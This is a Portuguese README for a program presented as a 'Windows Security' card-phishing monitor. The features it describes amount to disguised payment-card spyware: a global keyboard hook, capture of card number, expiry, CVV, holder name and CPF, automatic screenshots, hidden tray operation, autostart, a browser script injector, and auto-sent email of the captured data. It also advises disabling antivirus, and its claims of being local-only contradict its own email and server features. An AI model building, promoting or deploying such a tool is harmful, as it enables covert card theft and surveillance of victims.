# 🔒 Windows Security - Card Security Monitor

**Versão:** 3.0 | **Status:** Estável

Um monitor de segurança inteligente que detecta quando você digita dados de cartão de crédito e alerta antes que complete a transação.

---

## 📋 Índice

- [O Que É?](#o-que-é)
- [Funcionalidades](#-funcionalidades)
- [Instalação Rápida](#-instalação-rápida)
- [Como Usar](#-como-usar)
- [Estrutura do Projeto](#-estrutura-do-projeto)
- [Solução de Problemas](#-solução-de-problemas)
- [Dúvidas Frequentes](#-perguntas-frequentes)

---

## O Que É?

Um **programa de proteção contra phishing** que:

- ✅ Monitora teclado em tempo real
- ✅ Detecta padrões de cartão de crédito válidos (Luhn)
- ✅ Alerta APENAS quando dados estão completos
- ✅ Captura screenshot automaticamente
- ✅ Envia notificações por email (configurável)
- ✅ Runs discreetly in system tray
- ✅ Starts automatically with Windows
- ✅ 100% local - nenhum dado é enviado para servidores

---

## ✨ Funcionalidades

### 5 Campos Monitorados

| Campo | Exemplo | Validação |
|-------|---------|-----------|
| 💳 Cartão | 4532 0151 1283 0366 | 16 dígitos + Luhn |
| 📅 Validade | 12/25 | MM/AA ou MM/AAAA |
| 🔐 CVV | 123 | 3-4 dígitos |
| 👤 Nome Titular | JOÃO DA SILVA | Opcional |
| 📄 CPF | 123.456.789-10 | Opcional |

**Alerta aparece quando:** Cartão + Validade + CVV estão completos ✅

### Recursos Adicionais

- ✅ Validação com algoritmo de Luhn
- ✅ Detecção de bandeira (Visa, Mastercard, etc)
- ✅ Validação CPF brasileiro
- ✅ Mascaramento de dados sensíveis
- ✅ Screenshot automático
- ✅ Sistema de notificação
- ✅ Auto-inicialização com Windows
- ✅ Ícone na bandeja do sistema
- ✅ Cooldown entre alertas (60 segundos)

---

## 🚀 Instalação Rápida

### Opção 1: Usar o Executável (Recomendado)

```powershell
# 1. Abra PowerShell como Administrador
# 2. Navegue até a pasta
cd card-security-monitor

# 3. Execute o build
.\build.bat

# 4. Execute o programa
.\dist\WindowsSecurity.exe
```

### Opção 2: Modo Desenvolvimento (com Python)

```powershell
# 1. Instale Python 3.8+
# 2. Instale dependências
pip install -r requirements.txt

# 3. Execute
python main.py
```

---

## 🛠️ Como Usar

### Primeiro Uso

1. **Execute o programa**
   ```powershell
   .\dist\WindowsSecurity.exe
   ```

2. **Clique no ícone 🔒 na bandeja (system tray)**

3. **Configure autostart** (opcional)
   - Marque "Iniciar com o Windows"

4. **Minimize e deixe rodando** em background

### Durante o Monitoramento

- Abra um navegador
- Acesse um site com formulário de pagamento
- Comece a digitar dados
- Monitor detecta em tempo real
- Quando completar (cartão + validade + CVV) → ALERTA! 🚨

### Indicadores Visuais

```
⬜ Campo não detectado
✅ Campo detectado
[████░░░░░░░░░░░░░░] 60% - Progresso
```

### Quando o Alerta Aparece

Uma janela mostra:
- 💳 Cartão (últimos 4 dígitos visíveis)
- 📅 Data de validade
- 🔐 CVV (mascarado)
- 👤 Nome do titular (se detectado)
- 📄 CPF (mascarado)
- 📸 Screenshot da tela

**Você deve verificar:**
- ✓ O site tem HTTPS? (cadeado verde)
- ✓ É o site oficial?
- ✓ Você confia neste site?

---

## 📁 Estrutura do Projeto

```
card-security-monitor/
├── main.py                      # Interface principal
├── keyboard_monitor.py          # Monitor de teclado
├── pattern_detector.py          # Detector de padrões
├── alert_window.py              # Janela de alerta
├── screenshot_capture.py        # Captura de tela
├── autostart_manager.py         # Auto-inicialização
├── email_sender.py              # Envio de emails
├── system_tray.py               # Ícone na bandeja
├── browser_injector.py          # Injetor de scripts
│
├── requirements.txt             # Dependências Python
├── build.bat                    # Build script
├── email_config.json            # Configuração de email
├── README.md                    # Este arquivo
│
├── dist/                        # (gerado após build)
│   └── WindowsSecurity.exe      # Executável compilado
│
├── public/                      # Arquivos estáticos
├── server/                      # Backend Express (opcional)
└── capture_logs/                # Logs de captura
```

---

## 📦 Dependências

```
pynput              # Monitor de teclado
pywin32             # APIs do Windows
psutil              # Informações do sistema
Pillow              # Manipulação de imagens
pystray             # Ícone na bandeja
websockets          # Conexão WebSocket
```

Instaladas automaticamente com:

```powershell
pip install -r requirements.txt
```

---

## 🔧 Compilar Manualmente

```powershell
# 1. Instalar dependências
pip install -r requirements.txt

# 2. Limpar builds antigos
rmdir /s /q build 2>nul
rmdir /s /q dist 2>nul
del *.spec 2>nul

# 3. Compilar
pyinstaller --onefile --windowed --name "WindowsSecurity" `
  --add-data "email_config.json;." `
  --hidden-import=pynput.keyboard._win32 `
  --hidden-import=pynput.mouse._win32 `
  --hidden-import=PIL._tkinter_finder `
  --hidden-import=win32gui `
  --hidden-import=win32process `
  main.py
```

---

## 📋 Configuração de Email

### Habilitar Notificações por Email

1. **Editar `email_config.json`:**

```json
{
    "provider": "gmail",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "use_tls": true,
    "email_from": "seu_email@gmail.com",
    "email_password": "sua_senha_de_app",
    "email_to": "destino@gmail.com",
    "send_screenshot": true,
    "auto_send": true
}
```

2. **Para Gmail:**
   - Ativar 2FA em sua conta
   - Gerar "App Password" em: myaccount.google.com/apppasswords
   - Usar a senha gerada

3. **Testar:**
```powershell
python main.py --test-email
```

---

## 🔍 Validações Implementadas

### Cartão de Crédito
- ✅ Validação com **algoritmo de Luhn**
- ✅ Detecta bandeira (Visa, Mastercard, Amex, etc)
- ✅ 16 dígitos obrigatórios

### CPF
- ✅ Validação algoritmo oficial brasileiro
- ✅ 11 dígitos obrigatórios
- ✅ Rejeita CPFs com dígitos repetidos

### Data de Validade
- ✅ Formato MM/AA ou MM/AAAA
- ✅ Mês: 01-12
- ✅ Ano: válido para presente e futuro

### CVV
- ✅ 3-4 dígitos isolados
- ✅ Removidos números de cartão para evitar falsos positivos

---

## 🐛 Solução de Problemas

### "Python não encontrado"

```powershell
# Solução:
# 1. Baixe em: https://python.org
# 2. Marque "Add Python to PATH" na instalação
# 3. Reinicie PowerShell
# 4. Verifique: python --version
```

### "Permissão negada"

```powershell
# Execute PowerShell como Administrador:
# Win + X > Terminal (Admin)
# ou clique direito > "Executar como administrador"
```

### "Módulo não encontrado"

```powershell
pip install -r requirements.txt --force-reinstall
```

### "Antivírus bloqueia o .exe"

- Adicione exceção no antivírus
- Temporariamente desative para testes
- É normal em programas com PyInstaller

### Monitor não detecta nada

**Checklist:**

```
□ Monitor está iniciado? (Status: ✅ Ativo)
□ Navegador está em foco?
□ Você está digitando em um campo?
□ Dados são válidos? (cartão passa Luhn)
□ Aguardou 1-2 segundos?
```

**Teste com dados válidos:**

```
Cartão:   4532015112830366 (Visa)
Validade: 12/25
CVV:      123
```

### Nenhuma janela aparece

```powershell
# Execute como Administrador
# Verifique console para erros:
python main.py

# Procure por mensagens de erro específicas
```

---

## ❓ Perguntas Frequentes

**P: Meus dados são enviados para alguém?**
R: NÃO! Tudo é processado localmente. Nada é transmitido sem sua configuração.

**P: O programa pode ver minhas senhas?**
R: NÃO! Monitora apenas padrões de números (cartão, CPF).

**P: Funciona em Mac/Linux?**
R: Atualmente apenas Windows. Adaptações futuras possíveis.

**P: Quanto de memória consome?**
R: Menos de 50MB de RAM.

**P: Como desinstalar?**
R: Execute `uninstall.bat` ou remova da inicialização do Windows manualmente.

**P: Posso confiar neste programa?**
R: SIM! Código-fonte está disponível. Você pode revisar tudo.

---

## 🔒 Segurança e Privacidade

✅ **Análise Local** - Tudo processado no seu computador
✅ **Sem Registro** - Dados não são salvos em disco
✅ **Sem Transmissão** - Nenhuma conexão com internet necessária*
✅ **Código Aberto** - Você pode revisar o código-fonte
✅ **Mascaramento** - Alerta mostra apenas últimos 4 dígitos

*Exceto se configurar notificações por email

---

## 📊 Como Funciona Internamente

### 1. Monitor de Teclado
- Captura teclas digitadas globalmente no Windows
- Detecta qual aplicativo está em foco
- Ignora digitação em aplicações não-navegadores

### 2. Detector de Padrões
- Procura por padrões de cartão em tempo real
- Valida com algoritmo de Luhn
- Acumula dados em um buffer seguro

### 3. Validações
- Cartão: 16 dígitos + Luhn
- CPF: 11 dígitos + algoritmo brasileiro
- Validade: MM/AA ou MM/AAAA

### 4. Alerta
- Quando Cartão + Validade + CVV estão completos
- Captura screenshot automático
- Mostra janela na frente de tudo
- Toca som de alerta (se habilitado)

### 5. Notificação
- Envia email (se configurado)
- Inclui screenshot e dados mascarados
- Respeta intervalo de cooldown

---

## 💡 Dicas Úteis

1. **Primeira inicialização demora um pouco**
   - Próximas vezes são mais rápidas

2. **Execute como Administrador**
   - Necessário para monitorar globalmente

3. **Configure autostart**
   - Clique em "Iniciar com Windows" para proteção permanente

4. **Teste com dados válidos**
   - Use: 4532015112830366 (Visa válido)

5. **Verifique logs**
   - Abra console para ver detalhes: `python main.py`

---

## 🎓 Propósito Educacional

Este projeto demonstra:

- Monitoramento de entrada do usuário em Windows
- Padrão matching com regex
- Validação de dados financeiros
- Interfaces gráficas com Tkinter
- Empacotamento de aplicações Python
- Injeção de scripts em navegadores

Use para **aprender e se proteger**!

---

## 📚 Referências

- [pynput](https://pynput.readthedocs.io/) - Monitoramento de teclado/mouse
- [pywin32](https://pypi.org/project/pywin32/) - APIs do Windows
- [psutil](https://psutil.readthedocs.io/) - Informações do sistema
- [Pillow](https://pillow.readthedocs.io/) - Processamento de imagens
- [Luhn Algorithm](https://en.wikipedia.org/wiki/Luhn_algorithm) - Validação de cartão

---

## 📄 Licença

Código fornecido para fins educacionais e de proteção contra fraude.

---

## 🤝 Contribuições

Melhorias são bem-vindas! Você pode:

- Reportar bugs
- Sugerir melhorias
- Melhorar a documentação
- Adaptar para outras plataformas

---

## 📞 Suporte

Para problemas:

1. Verifique a seção "Solução de Problemas" acima
2. Reinstale dependências: `pip install -r requirements.txt --force-reinstall`
3. Recrie o .exe: `.\build.bat`
4. Execute em modo desenvolvimento para ver logs: `python main.py`

---

**Criado com ❤️ para sua segurança**

🔒 Proteja seus dados. Use com segurança.
